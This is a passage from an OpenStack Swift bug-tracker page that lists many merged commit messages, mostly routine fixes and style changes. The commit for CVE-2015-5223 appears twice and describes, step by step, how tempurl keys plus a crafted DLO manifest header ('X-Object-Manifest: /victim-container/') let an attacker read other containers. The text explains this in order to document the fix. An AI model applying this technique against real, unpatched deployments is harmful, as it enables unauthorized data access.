Note that 'object\_replication\_last' and 'object\_replication\_time' are
considered to be transitional and will be removed in the subsequent
releases. Use 'replication\_last' and 'replication\_time' instead.
Additionaly this patch adds the count in swift-recon and it will be
showed as follows:
$ swift-recon object -r
========================================================================
=======
--> Starting reconnaissance on 4 hosts
========================================================================
=======
[2014-11-27 16:14:09] Checking on replication
[replication\_failure] low: 0, high: 0, avg: 0.0, total: 0, Failed: 0.0%,
no\_result: 0, reported: 4
[replication\_success] low: 3, high: 3, avg: 3.0, total: 12,
Failed: 0.0%, no\_result: 0, reported: 4
[replication\_time] low: 0, high: 0, avg: 0.0, total: 0, Failed: 0.0%,
no\_result: 0, reported: 4
[replication\_attempted] low: 1, high: 1, avg: 1.0, total: 4,
Failed: 0.0%, no\_result: 0, reported: 4
Oldest completion was 2014-11-27 16:09:45 (4 minutes ago) by
192.168.0.4:6002.
Most recent completion was 2014-11-27 16:14:19 (-10 seconds ago) by
192.168.0.1:6002.
========================================================================
=======
In case there is a cluster which has servers, a server runs with this
patch and the other servers run without this patch. If swift-recon
executes on the server which runs with this patch, there are unnecessary
information on the output such as [failure], [success] and [attempted].
Because other servers which run without this patch are not able to
send a response with information that this patch needs.
Therefore once you apply this patch, you also apply this patch to other
servers before you execute swift-recon.
DocImpact
Change-Id: Iecd33655ae2568482833131f422679996c374d78
Co-Authored-By: Kenichiro Matsuda <matsuda\_kenichi@jp.fujitsu.com>
Co-Authored-By: Brian Cline <bcline@softlayer.com>
Implements: blueprint enable-object-replication-failure-in-recon
commit eeb0fa40a19917e6548f95f0bd3c08736928449b
Author: Christian Schwede <cschwede@redhat.com>
Date: Thu Aug 6 07:21:15 2015 +0000
Make swift-ring-builder filename usage more consistent
Sometimes the given argument is internally altered and another filename is used
without a note to the operator. Even worse, a given .ring.gz filename is
sometimes written out as builder file, without updating the corresponding
.builder file.
There is already a method to parse the given argv and return the name of the
builder and ring file. However, it's rarely used and no warning is given to the
user if it is altered. This patch uses the already parsed builder and ring file
name instead of argv[1], and also adds a note to the user if the used filename
is differently to the one given as argument.
Closes-Bug: 1482096
Change-Id: I2f8ef23aeab8b07caaa799f7dcd57e684b4b2ad2
commit b75d2a4e37d4c86763a2cc56c6dd53ebe2e0de19
Author: Bill Huber <wbhuber@us.ibm.com>
Date: Mon Aug 17 13:54:44 2015 -0500
Quorum on durable response is too low
Increase the .durable quorum from 2 to "parity + 1" to guarantee
that we will never fail to rebuild an object. Otherwise, with
low durable responses back (< parity + 1), the putter objects
return with failed attribute set to true, thereby failing the
rebuild of fragments for an object.
Change-Id: I80d666f61273e589d0990baa78fd657b3470785d
Closes-Bug: 1484565
commit fa35e38c9f83f704eb087f80157cbe33b23b9db2
Author: Kai Zhang <zakir.exe@gmail.com>
Date: Fri Aug 14 16:46:35 2015 -0700
Fix some minor typos
Fixed some typos in function name and comments.
Change-Id: Ida76ab4b331a51b71e57650702acc136e66ba4b2
commit 5b246e875fe9ac3d764ea581ad52b04238f5bcc8
Author: Kota Tsuyuzaki <tsuyuzaki.kota@lab.ntt.co.jp>
Date: Wed Jul 22 10:39:22 2015 -0700
Fix EC range GET/COPY handling
When range GET (or COPY) for an EC object requested, if the requested range
starts from more than last segments alignment (i.e.
ceil(object\_size/segment\_size) \* segment\_size), proxy server will return
the original content length w/o body, though Swift should return an error
massage as a body and the length of message as the content length.
The current behavior will cause stuck on some client. (e.g. curl)
This patch fixes that proxy enables to return correct response, even if such
an over range requested.
Co-Authored-By: Clay Gerrard <clay.gerrard@gmail.com>
Change-Id: I21f81c842f563ac4dddc69011ed759b744bb20bd
Closes-Bug: #1475499
commit 7064706b2721c36c5181267f58704b9344ad4ac0
Author: Samuel Merritt <sam@swiftstack.com>
Date: Tue Aug 11 10:17:20 2015 -0500
Fix 500 in versioned writes with bad Destination
When this code lived in the proxy, it was protected by an "except
HTTPException" clause in proxy.Application.handle\_request(). When it
moved to middleware, it lost that, and then things like
constraints.check\_name\_format that raised HTTPException would cause
500s. The HTTPException would make it all the way out to catch\_errors
and get translated to a 500.
This commit just wraps a couple try/excepts around the bits in
versioned writes that can raise HTTPException. I tried to make it use
wsgify so I could get that for free, but that wound up being a real
pain because env/start\_response are plumbed through pretty much the
whole versioned-writes middleware.
Closes-Bug: 1483705
Change-Id: Ife165bf709e64f313ed07c779b21914045e51f25
commit 035a411660ca02983cd486312266c67d78a2359c
Author: Thiago da Silva <thiago@redhat.com>
Date: Sun Nov 9 13:13:27 2014 -0500
versioned writes middleware
Rewrite object versioning as middleware to simplify the PUT method
in the object controller.
The functionality remains basically the
same with the only major difference being the ability to now
version slo manifest files. dlo manifests are still not
supported as part of this patch.
Co-Authored-By: Clay Gerrard <clay.gerrard@gmail.com>
DocImpact
Change-Id: Ie899290b3312e201979eafefb253d1a60b65b837
Signed-off-by: Thiago da Silva <thiago@redhat.com>
Signed-off-by: Prashanth Pai <ppai@redhat.com>
commit 968c91a465627bb9317ed6e2ae9ccd818c83c0c4
Author: Alistair Coles <alistair.coles@hp.com>
Date: Tue Jul 28 10:31:54 2015 +0100
Replace assertTrue(not <condition>) with assertFalse(<condition>)
The replacement of assert\_ with assertTrue [1] resulted in a number of
tests using calls of the form assertTrue(not <condition>). This patch
replaces those with assertFalse(<condition>).
[1] change I74705c6498249337bfdf955d62e0ad972035bc1f
Change-Id: I78b49558f4425c2335df187b1793d1e4b3c514b1
commit 4ac1fea5d111c669ff827f4eb29c0735cbad6ba5
Author: Zhao Lei <zhaolei@cn.fujitsu.com>
Date: Fri Aug 7 22:07:01 2015 +0800
Fix some spelling typo in comments
s/overide/override for object-expirer.conf and sample.
s/automaticaly/automatically for swift/proxy/controllers/obj.py
Change-Id: Ife107c7a1005a5d4959288db50a7f8f33c522dd4
Signed-off-by: Zhao Lei <zhaolei@cn.fujitsu.com>
commit 9456af35a2832aeafc4a4e78ebd0d4142ead71cd
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Thu Aug 6 00:55:36 2015 +0530
pep8 fix: assertEquals -> assertEqual
assertEquals is deprecated in py3,changes in
dir:
\*test/unit/obj/\*
\*test/unit/test\_locale/\*
Change-Id: I3dd0c1107165ac529f1cd967363e5cf408a1d02b
commit 1952451ed7e97e2bfa3b11dfa5000cc39f712084
Author: Zhao Lei <zhaolei@cn.fujitsu.com>
Date: Fri Aug 7 21:57:08 2015 +0800
Fix a spelling typo in comment
s/automaticaly/automatically/ for swift/proxy/controllers/obj.py
Change-Id: I405441383739637e0b13746d6f4e2bad1c874b4d
Signed-off-by: Zhao Lei <zhaolei@cn.fujitsu.com>
commit c35cc13b8abeb97400632cbe8ec56fc1040d8210
Author: Bill Huber <wbhuber@us.ibm.com>
Date: Thu Aug 6 10:01:17 2015 -0500
pep8 fix: assertEquals -> assertEqual
assertEquals is deprecated in py3 in the following dir:
test/unit/proxy/\*
Change-Id: Ie2c7e73e1096233a10ee7fbf6f88386fa4d469d6
commit 239e94e62518f36601fb18119700269753d02a01
Author: Bill Huber <wbhuber@us.ibm.com>
Date: Thu Aug 6 09:28:51 2015 -0500
pep8 fix: assertEquals -> assertEqual
assertEquals is deprecated in py3 in the following dir:
test/probe/\*
Change-Id: Ie08dd7a8a6c48e3452dfe4f2b41676330ce455d5
commit 49b9ba37ac522502ccad66fba7bfef375eab145d
Author: Bill Huber <wbhuber@us.ibm.com>
Date: Wed Aug 5 14:51:32 2015 -0500
pep8 fix: assertEquals -> assertEqual
assertEquals is deprecated in py3 in the following dir:
test/functional/\*
Change-Id: Iee7f8ffca9838ccc521107180697d91ac9559405
commit 81816bebe6b3506af8cabaa7ebe265c70f3499cd
Author: kenichiro matsuda <matsuda\_kenichi@jp.fujitsu.com>
Date: Thu Aug 6 10:13:02 2015 +0900
Fix shebang of commands
Fix shebang of following commands.
$ grep '#!/usr/bin/python' swift/bin/\*
swift/bin/swift-account-info:#!/usr/bin/python
swift/bin/swift-container-info:#!/usr/bin/python
swift/bin/swift-container-sync:#!/usr/bin/python
swift/bin/swift-recon:#!/usr/bin/python
swift/bin/swift-ring-builder:#!/usr/bin/python
swift/bin/swift-ring-builder-analyzer:#!/usr/bin/python
Change-Id: I564d1d8abd76eba57730fc2f30263b0a0f809867
Closes-Bug: #1481623
commit 652f0f9da408e955843f87a504b3dab5be3cff80
Author: Pete Zaitcev <zaitcev@kotori.zaitcev.us>
Date: Wed Aug 5 15:33:29 2015 -0600
Having said H, I, J, we ought to say K
In the long run, we might want to stop these updates. But this
decision is above my pay grade.
Change-Id: I335558e1da8052be1b215fbad51244b47af3d81b
commit ed3aec2146b114c85bb3b196c999bf3f44fe159e
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Thu Aug 6 00:18:52 2015 +0530
pep8 fix: assertEquals -> assertEqual
assertEquals is deprecated in py3 in
dir: test/unit/container/\*
Change-Id: I3333022ed63ce03198bc73147246d91d2442a440
commit f449e914728fdcaf0870c15b9fc5ebd16a9df916
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Wed Aug 5 22:32:02 2015 +0530
pep8 fix: assertEquals -> assertEqual
assertEquals is deprecated in py3, fixing in:
dir: test/unit/cli/\*
Change-Id: I9a2fc1f717beafd5fa8408942046e310e8de0318
commit 6594bbebb582801c069c4966352fee19eadef2f8
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Wed Aug 5 22:25:46 2015 +0530
pep8 fix: assertEquals -> assertEqual
assertEquals is deprecated in py3 in
dir : test/unit/account/\*
Change-Id: I70415197df1b0d58d4d6e219733c13a9c9cdfff7
commit 89f59062864e5cbfc839a6084c323ce35438aa57
Author: Ben Martin <blmartin@us.ibm.com>
Date: Mon Jul 27 14:19:09 2015 -0500
+Document method to avoid rsync filling root drive
When rsync pushes to a remote node with an unmounted drive and if
certain steps are not taken, rsync may attempt to write files to
the local drive at the location where the drive was mounted.
There are two suggested solutions for this issue:
1) Set the permissions for all mount points in /srv/node/
to root:root 755
2) Mount the drives elsewhere and symlink the drives to /srv/.../
The first method ensures that only root and not the swift user
can write in the /srv/.../ directories.
The second method will prompt a broken link issue if rsync
attempts to write to an unmounted drive.
Change-Id: I60ce4ed9ef8401768d5f78b6806cbb2e2a65303e
Closes-Bug: #1470576
commit f0d51882b921075f5309ed6ff07385dc6103d4dc
Author: Charles Hsu <charles0126@gmail.com>
Date: Wed Aug 5 22:09:40 2015 +0800
Add extra\_header\_count to document and config.
Change-Id: Iec86b488d71553c295afe7098822ce2046df9546
commit 7071762d3698c59fabdee76890e300f81417be74
Author: Clay Gerrard <clay.gerrard@gmail.com>
Date: Tue Aug 4 23:15:37 2015 -0700
Fix TypeError if backend response doesn't have expected headers
There was some debug logging mixed in with some error handling on PUTs
that was relying on a very specific edge would only encounter a set of
backend responses that included the expected set of headers to diagnoise
the failure.
But the backend responses may not always have the expected headers.
The proxy debug logging should be more robust to missing headers.
It's a little hard to follow, but if you look `\_connect\_put\_node` in
swift.proxy.controller.obj - you'll see that only a few connections can
make their way out of the initial put connection handling with a "resp"
attribute that is not None. In the happy path (e.g. 100-Continue) it's
explictly set to None, and in most errors (Timeout, 503, 413, etc) a new
connection will be established to the next node in the node iter.
Some status code will however allow a conn to be returned for validation
in `\_check\_failure\_put\_connections`, i.e.
\* 2XX (e.g. 0-byte PUT would not send Expect 100-Continue)
\* 409 - Conflict with another timestamp
\* 412 - If-None-Match that encounters another object
... so I added tests for those - fixing a TypeError along the way.
Change-Id: Ibdad5a90fa14ce62d081e6aaf40aacfca31b94d2
commit 01848c565e5821d2500cb234261c70871e562ebe
Author: David Goetz <dpgoetz@gmail.com>
Date: Fri Jun 26 17:27:31 2015 -0700
Speed up reaper for a big account delete and some better error handling
In run\_forever mode, run the reaper on all three copies of the account
DB instead of just the first one and shard the containers between them.
Change-Id: Id182e89dad70df9d6d9988523861b8085d74c765
commit 5b24b2249878e25ee702ee4237227c984036c6ec
Author: OpenStack Proposal Bot <openstack-infra@lists.openstack.org>
Date: Tue Aug 4 06:29:11 2015 +0000
Imported Translations from Transifex
For more information about this automatic import see:
https://wiki.openstack.org/wiki/Translations/Infrastructure
Change-Id: I9f0e5fd25ec143fb87de1895794764dea4587f93
commit 8d06f56c1fac23bca463d3a93353da6b50ad5bed
Author: Takashi NATSUME <natsume.takashi@lab.ntt.co.jp>
Date: Tue Aug 4 10:14:25 2015 +0900
Fix typo of 'receive'
Change-Id: Ic01defa8d48ba4b7f4bd6cbe4d59b9bab468a36c
commit 310ac18d61b001bdf297505243d8aa62e8fde8fe
Author: Brian Reitz <brian.reitz@oracle.com>
Date: Mon Aug 3 16:28:31 2015 -0500
Convert docstring to a comment in test\_denied\_DELETE\_of\_versioned\_object unit test.
Docstrings cause issues for nose and created non standard test output for this test.
Change-Id: I91e6450480567de0ee0b18d3efae01a4b94f0a86
commit 21a7b4aaa6f991c0eeb8f74876b14fe22713586b
Author: Alistair Coles <alistair.coles@hp.com>
Date: Mon Aug 3 14:58:24 2015 +0100
Test that get\_hashes ignores only removed hash dir
Add test for case not yet covered by unit tests: suffix dir
has two hash dirs, one with expired tombstone. That hash dir gets
removed and its hash is not included in the suffix hash, but the
remaining hash dir's hash is reported.
Change-Id: I031a022daed6b8a66dfd04bea1b4d5eebcb882b3
commit 44917c8a90e79a85cd6c6821d8b6d043f83b322d
Author: Clay Gerrard <clay.gerrard@gmail.com>
Date: Mon Jul 20 13:06:48 2015 -0700
Handle removed suffix dirs the same as empty suffix dirs
When hashes suffix dirs, the directory might have gotten cleaned up while
still appearing in hashes.pkl. It would even get cleaned up the next time.
For example, given this really old tombstone:
objects/846/3d0/d3a20154d0a828a032aba6860397c3d0/1432267961.41808.ts
Prior to this commit, a call to get\_hashes() would reap the old
tombstone and any empty containing dirs, but the resulting hashes.pkl
would still contain {'3d0': 'd41d8cd98f00b204e9800998ecf8427e'} even
though there's no such suffix dir any more.
("d41d8cd98f00b204e9800998ecf8427e" is the MD5 of the empty string.)
Then, a \*subsequent\* get\_hashes() call would omit 3d0 from the resulting
hash, so then hashes.pkl would no longer contain 3d0. This difference
would result in a little useless replication traffic while nodes without
a particular part/suffix pair, but who disagreed on how that showed up
in hashes.pkl, tried to push their version of nothing to one another.
Now, an empty suffix dir doesn't appear in hashes.pkl at all, whether
it's for replication or EC, or whether it's for the get\_hashes() call
that reaped the suffix dirs or not.
Co-Author: Samuel Merritt <sam@swiftstack.com>
Change-Id: Ie1bfb1cc56d0fc030c6db42f97b55d140695cf1f
commit cf4d50bd68b658d35759fb56446557858dcd9572
Author: Alistair Coles <alistair.coles@hp.com>
Date: Fri Jun 5 13:06:29 2015 +0100
Make test\_proxy work independent of env vars
test.unit.common.test\_internal\_client.TestSimpleClient.test\_proxy
will fail if the environment has http\_proxy set and does not have
no\_proxy=127.0.0.1 set. This seems to be because urllib overrides
any proxy arg passed to the Request with the env http\_proxy var,
unless the Request host is in no\_proxy.
We don't need to test urllib, so this patch changes the test to
simply ensure that swift code does pass the correct proxy arg to
urllib2.urlopen. That avoids testers having to make sure their
env vars are compliant to successfully run unit tests. While it is
reasonable to think that 127.0.0.1 is in the no\_proxy list, it
shouldn't be a requirement pass swift tests.
Change-Id: Iff91acdb76fabe7056b3e90e2756e27fe5105817
commit 67513fc17c23066f6547b5e3c4ab2dc852e4f7f0
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Sat Jun 27 23:26:47 2015 +0530
Adding bandit for security static analysis testing in swift
This change adds a basic bandit config for Swift. It can be invoked
by running the tox environment for bandit;
tox -e bandit
This is an initial step for using bandit with Swift
and it should be revisited to improve the testing as more is learned
about the specific needs of the Swift code base.As per now some tests
are excluded as they were used on purpose.
https://wiki.openstack.org/wiki/Security/Projects/Bandit
Implements: blueprint swift-bandit
Change-Id: I621be9a68ae9311f3a6eadd1636b05e646260cf2
commit 768d7ab074807175471d589de96d091e3239052e
Author: Clay Gerrard <clay.gerrard@gmail.com>
Date: Thu Jul 30 15:30:35 2015 -0700
Add a probetest for HUP/reload
This would have been enough to catch the regression, and we can extend
them as we work on any future ehancements to our process management.
Change-Id: I9a1b57aa15663380c45cf783afc8212ab4ffbace
commit c5b5cf91a984f80cc6cbe42735b242083d700542
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Tue Jul 28 21:03:05 2015 +0530
test/unit: Replace python print operator with print function (pep H233, py33)
'print' function is compatible with 2.x and 3.x python versions
Link : https://www.python.org/dev/peps/pep-3105/
Python 2.6 has a \_\_future\_\_ import that removes print as language syntax,
letting you use the functional form instead
Change-Id: I94e1bc6bd83ad6b05695c7ebdf7cbfd8f6d9f9af
commit dd2f1be3b124d3901ebbc176a7adc462b6449667
Author: Ondrej Novy <ondrej.novy@firma.seznam.cz>
Date: Tue Jun 16 17:42:58 2015 +0200
Time synchronization check in recon.
This change add call time to recon middleware and param --time to
recon CLI. This is usefull for checking if time in cluster is
synchronized.
Change-Id: I62373e681f64d0bd71f4aeb287953dd3b2ea5662
commit cbcfb74132aba4d5834dc9cf33dc4f664b82d39a
Author: Clay Gerrard <clay.gerrard@gmail.com>
Date: Wed Jul 22 19:32:46 2015 -0700
Cleanup nits from container\_update\_timeout
Change-Id: Ib17fc9a027db267350abc5a7db4e3172dfff7913
commit 2289137164231d7872731c2cf3d81b86f34f01a4
Author: John Dickinson <me@not.mn>
Date: Sat May 23 15:40:03 2015 -0700
do container listing updates in another (green)thread
The actual server-side changes are simple. The tests are a different
matter. Many changes were needed to the object server tests to
handle the now-async calls to the container server. In an effort to
test this properly, some drive-by changes were made to improve tests.
I tested this patch by doing zero-byte object writes to one container
as fast as possible. Then I did it again while also saturating 2 of the
container replica's disks. The results are linked below.
https://gist.github.com/notmyname/2bb85acfd8fbc7fc312a
DocImpact
Change-Id: I737bd0af3f124a4ce3e0862a155e97c1f0ac3e52
commit c8131c6abb17b00b043a9b95e65be819e1fd3c9d
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Sun Jul 12 14:48:35 2015 +0530
sys.exc\_type/exc\_value/exc\_traceback are Deprecated
sys.exc\_info() contains a tuple of these three.
Change-Id: I530cbeb37c43da98b4924db41f6604871077bd47

| **tags**: | added: in-feature-crypto |
| --- | --- |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2015-09-04:  [**Fix merged to swift (stable/kilo)**](/swift/%2Bbug/1449212/comments/98) |  |  | [#98](/swift/%2Bbug/1449212/comments/98) |
| --- | --- | --- | --- |

[Download full text](https://bugs.launchpad.net/swift/%2Bbug/1449212/comments/98/%2Bdownload) (3.3 KiB)

Reviewed: <https://review.openstack.org/217255>

Committed: <https://git.openstack.org/cgit/openstack/swift/commit/?id=f81435d340140a0b54ac555870423894ee9b2131>

Submitter: Jenkins

Branch: stable/kilo

commit f81435d340140a0b54ac555870423894ee9b2131

Author: Samuel Merritt <email address hidden>

Date: Tue Aug 11 09:10:13 2015 -0500

Better scoping for tempurls, especially container tempurls

It used to be that a GET of a tempurl referencing a large object would

    let you download that large object regardless of where its segments

    lived. However, this led to some violated user expectations around

    container tempurls.

(Note on shorthand: all tempurls reference objects. However, "account

    tempurl" and "container tempurl" are shorthand meaning tempurls

    generated using a key on the account or container, respectively.)

Let's say an application is given tempurl keys to a particular

    container, and it does all its work therein using those keys. The user

    expects that, if the application is compromised, then the attacker

    only gains access to the "compromised-container". However, with the old

    behavior, the attacker could read data from \*any\* container like so:

1) Choose a "victim-container" to download

2) Create PUT and GET tempurl for any object name within the

       "compromised-container". The object doesn't need to exist;

       we'll create it.

3) Using the PUT tempurl, upload a DLO manifest with

       "X-Object-Manifest: /victim-container/"

4) Using the GET tempurl, download the object created in step 3. The

       result will be the concatenation of all objects in the

       "victim-container".

Step 3 need not be for all objects in the "victim-container"; for

    example, a value "X-Object-Manifest: /victim-container/abc" would only

    be the concatenation of all objects whose names begin with "abc". By

    probing for object names in this way, individual objects may be found

    and extracted.

A similar bug would exist for manifests referencing other accounts

    except that neither the X-Object-Manifest (DLO) nor the JSON manifest

    document (SLO) have a way of specifying a different account.

This change makes it so that a container tempurl only grants access to

    objects within its container, \*including\* large-object segments. This

    breaks backward compatibility for container tempurls that may have

    pointed to cross container \*LO's, but (a) there are security

    implications, and (b) container tempurls are a relatively new feature.

This works by having the tempurl middleware install an authorization

    callback ('swift.authorize' in the WSGI environment) that limits the

    scope of any requests to the account or container from which the key

    came.

This requires swift.authorize to persist for both the manifest request

    and all segment requests; this is done by having the proxy server

    restore it to the WSGI environment prior to returning from \_\_call\_\_.

[CVE-2015-5223]

Co-Authored-By: Clay Gerrard <email address hidden>

    Co-Authored-By: Alistair Coles <alistair.co...

[Read more...](/swift/%2Bbug/1449212/comments/98)

Reviewed: https://review.openstack.org/217255
Committed: https://git.openstack.org/cgit/openstack/swift/commit/?id=f81435d340140a0b54ac555870423894ee9b2131
Submitter: Jenkins
Branch: stable/kilo
commit f81435d340140a0b54ac555870423894ee9b2131
Author: Samuel Merritt <sam@swiftstack.com>
Date: Tue Aug 11 09:10:13 2015 -0500
Better scoping for tempurls, especially container tempurls
It used to be that a GET of a tempurl referencing a large object would
let you download that large object regardless of where its segments
lived. However, this led to some violated user expectations around
container tempurls.
(Note on shorthand: all tempurls reference objects. However, "account
tempurl" and "container tempurl" are shorthand meaning tempurls
generated using a key on the account or container, respectively.)
Let's say an application is given tempurl keys to a particular
container, and it does all its work therein using those keys. The user
expects that, if the application is compromised, then the attacker
only gains access to the "compromised-container". However, with the old
behavior, the attacker could read data from \*any\* container like so:
1) Choose a "victim-container" to download
2) Create PUT and GET tempurl for any object name within the
"compromised-container". The object doesn't need to exist;
we'll create it.
3) Using the PUT tempurl, upload a DLO manifest with
"X-Object-Manifest: /victim-container/"
4) Using the GET tempurl, download the object created in step 3. The
result will be the concatenation of all objects in the
"victim-container".
Step 3 need not be for all objects in the "victim-container"; for
example, a value "X-Object-Manifest: /victim-container/abc" would only
be the concatenation of all objects whose names begin with "abc". By
probing for object names in this way, individual objects may be found
and extracted.
A similar bug would exist for manifests referencing other accounts
except that neither the X-Object-Manifest (DLO) nor the JSON manifest
document (SLO) have a way of specifying a different account.
This change makes it so that a container tempurl only grants access to
objects within its container, \*including\* large-object segments. This
breaks backward compatibility for container tempurls that may have
pointed to cross container \*LO's, but (a) there are security
implications, and (b) container tempurls are a relatively new feature.
This works by having the tempurl middleware install an authorization
callback ('swift.authorize' in the WSGI environment) that limits the
scope of any requests to the account or container from which the key
came.
This requires swift.authorize to persist for both the manifest request
and all segment requests; this is done by having the proxy server
restore it to the WSGI environment prior to returning from \_\_call\_\_.
[CVE-2015-5223]
Co-Authored-By: Clay Gerrard <clayg@swiftstack.com>
Co-Authored-By: Alistair Coles <alistair.coles@hp.com>
Co-Authored-By: Christian Schwede <cschwede@redhat.com>
Co-Authored-By: Matthew Oliver <matt@oliver.net.au>
Closes-Bug: 1449212
Change-Id: I11078af178cb9acdd9039388282fcd0db165ba7a

[Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray)
on 2015-09-08

| Changed in ossa: | |
| --- | --- |
| **status**: | Fix Committed → Fix Released |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2015-09-08:  [**Fix proposed to swift (feature/hummingbird)**](/swift/%2Bbug/1449212/comments/99) |  |  | [#99](/swift/%2Bbug/1449212/comments/99) |
| --- | --- | --- | --- |

Fix proposed to branch: feature/hummingbird

Review: <https://review.openstack.org/221410>

Fix proposed to branch: feature/hummingbird
Review: https://review.openstack.org/221410

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2015-09-08:  [**Fix merged to swift (feature/hummingbird)**](/swift/%2Bbug/1449212/comments/100) |  |  | [#100](/swift/%2Bbug/1449212/comments/100) |
| --- | --- | --- | --- |

[Download full text](https://bugs.launchpad.net/swift/%2Bbug/1449212/comments/100/%2Bdownload) (70.7 KiB)

Reviewed: <https://review.openstack.org/221410>

Committed: <https://git.openstack.org/cgit/openstack/swift/commit/?id=eb8f1f83f1cfc63d8452bc30096fd1c145781527>

Submitter: Jenkins

Branch: feature/hummingbird

commit cb683d391cb66d0f52830de16760c80fd2afedf9

Author: OpenStack Proposal Bot <email address hidden>

Date: Sat Sep 5 06:17:51 2015 +0000

Imported Translations from Transifex

For more information about this automatic import see:

    <https://wiki.openstack.org/wiki/Translations/Infrastructure>

Change-Id: I2d92b8e34a665fb0bb4c048cfb0c59de295dfce6

commit e4542455c8a07b7981c247df8b737816062c1655

Author: Emett Speer <email address hidden>

Date: Wed Sep 2 17:18:03 2015 -0700

[Labs] Update links to Cloud Admin Guide

Update links to the Cloud Admin Guide after the

    RST conversion of that book altered URLs.

Change-Id: I899f8938498b744e62887968a65e58c00ef27f1b

commit 58fcc07523978306cd3889ada73af5d9e664cf59

Author: Christian Schwede <email address hidden>

Date: Wed Sep 2 10:52:34 2015 +0000

Test if container\_sweep is executed on unmounted devices

This change ensures that container\_sweep is not run if a device is not mounted

    and mount\_check is set to True.

Change-Id: I823083c8431d9e61fd426508033ec9188503957b

commit e02609c66a804845672413b06830b87395afef31

Author: Samuel Merritt <email address hidden>

Date: Tue Sep 1 15:19:50 2015 -0700

Preserve traceback in swift-dispersion-report

Commit c690bcb fixed a bug in the dispersion report, but changed this

    from a bare "raise" to "raise err", which loses the traceback. Not a

    big deal, but worth putting back IMO.

Change-Id: Id5b72153a4b8df8e3faaf1fa3fb2040e28ba85cc

commit d06d4ad0fd2dfe69da8008e729651264522c6c06

Author: Minwoo Bae <email address hidden>

Date: Tue Sep 1 15:08:44 2015 -0500

Included reference in swift.obj.diskfile to enumerate the string

    used for data file paths.

Change-Id: Ie22caa678bc00dfc43fabec7efbbb9f34490f1b5

commit 615c7a204b9386e05c5bab658bfe96766ad1e680

Author: Brian Cline <email address hidden>

Date: Tue Sep 1 10:51:20 2015 -0500

Adds useful dispersion info from changelog

Change-Id: I1a45088fc32620b02ff9a754b02ec1eb75a59d6e

commit 3b8755098a1786c5447abf158bd686293a82977c

Author: janonymous <email address hidden>

Date: Sun Aug 2 21:29:13 2015 +0530

Replace a / b with a // b to use integer division where needed

Change-Id: I72c81faa62786e140b0de00e3a04934bf1b5adbd

commit 524c89b7eeff037b8a6b421888771e15f98c2da2

Author: John Dickinson <email address hidden>

Date: Fri Aug 21 13:39:41 2015 -0700

Updated CHANGELOG, AUTHORS, and .mailmap for 2.4.0 release.

Change-Id: Ic6301146b839c9921bb85c4f4c1e585c9ab66661

commit 05de1305a903ee4ce9c8c50fde53c552d5b90d51

Author: Clay Gerrard <email address hidden>

Date: Thu Aug 27 18:35:09 2015 -0700

Make ssync\_sender send valid chunked requests

The connect method of ssync\_sender tells the remote connection that it's

    going to send a valid HTTP chunked request, but if the remote end needs

    to respond with an error of any kind sender th...

Reviewed: https://review.openstack.org/221410
Committed: https://git.openstack.org/cgit/openstack/swift/commit/?id=eb8f1f83f1cfc63d8452bc30096fd1c145781527
Submitter: Jenkins
Branch: feature/hummingbird
commit cb683d391cb66d0f52830de16760c80fd2afedf9
Author: OpenStack Proposal Bot <openstack-infra@lists.openstack.org>
Date: Sat Sep 5 06:17:51 2015 +0000
Imported Translations from Transifex
For more information about this automatic import see:
https://wiki.openstack.org/wiki/Translations/Infrastructure
Change-Id: I2d92b8e34a665fb0bb4c048cfb0c59de295dfce6
commit e4542455c8a07b7981c247df8b737816062c1655
Author: Emett Speer <speer.emett@gmail.com>
Date: Wed Sep 2 17:18:03 2015 -0700
[Labs] Update links to Cloud Admin Guide
Update links to the Cloud Admin Guide after the
RST conversion of that book altered URLs.
Change-Id: I899f8938498b744e62887968a65e58c00ef27f1b
commit 58fcc07523978306cd3889ada73af5d9e664cf59
Author: Christian Schwede <cschwede@redhat.com>
Date: Wed Sep 2 10:52:34 2015 +0000
Test if container\_sweep is executed on unmounted devices
This change ensures that container\_sweep is not run if a device is not mounted
and mount\_check is set to True.
Change-Id: I823083c8431d9e61fd426508033ec9188503957b
commit e02609c66a804845672413b06830b87395afef31
Author: Samuel Merritt <sam@swiftstack.com>
Date: Tue Sep 1 15:19:50 2015 -0700
Preserve traceback in swift-dispersion-report
Commit c690bcb fixed a bug in the dispersion report, but changed this
from a bare "raise" to "raise err", which loses the traceback. Not a
big deal, but worth putting back IMO.
Change-Id: Id5b72153a4b8df8e3faaf1fa3fb2040e28ba85cc
commit d06d4ad0fd2dfe69da8008e729651264522c6c06
Author: Minwoo Bae <minwoob@us.ibm.com>
Date: Tue Sep 1 15:08:44 2015 -0500
Included reference in swift.obj.diskfile to enumerate the string
used for data file paths.
Change-Id: Ie22caa678bc00dfc43fabec7efbbb9f34490f1b5
commit 615c7a204b9386e05c5bab658bfe96766ad1e680
Author: Brian Cline <bcline@softlayer.com>
Date: Tue Sep 1 10:51:20 2015 -0500
Adds useful dispersion info from changelog
Change-Id: I1a45088fc32620b02ff9a754b02ec1eb75a59d6e
commit 3b8755098a1786c5447abf158bd686293a82977c
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Sun Aug 2 21:29:13 2015 +0530
Replace a / b with a // b to use integer division where needed
Change-Id: I72c81faa62786e140b0de00e3a04934bf1b5adbd
commit 524c89b7eeff037b8a6b421888771e15f98c2da2
Author: John Dickinson <me@not.mn>
Date: Fri Aug 21 13:39:41 2015 -0700
Updated CHANGELOG, AUTHORS, and .mailmap for 2.4.0 release.
Change-Id: Ic6301146b839c9921bb85c4f4c1e585c9ab66661
commit 05de1305a903ee4ce9c8c50fde53c552d5b90d51
Author: Clay Gerrard <clay.gerrard@gmail.com>
Date: Thu Aug 27 18:35:09 2015 -0700
